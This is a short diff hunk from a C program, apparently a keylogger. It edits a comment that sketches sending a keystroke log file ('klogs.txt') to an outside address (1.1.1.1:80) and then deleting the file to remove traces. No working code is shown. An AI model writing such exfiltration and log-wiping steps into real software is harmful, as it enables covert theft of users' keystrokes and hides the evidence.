@@ -84,6 +84,6 @@ int main(void)
     }
 
     // exfiltrate and remove any leftover logs...
-    // for example: Exfil(real_key, "1.1.1.1:80"); DeleteFile("klogs.txt");
+    // for example: Exfil("klogs.txt", "1.1.1.1:80"); DeleteFile("klogs.txt");
 }
 
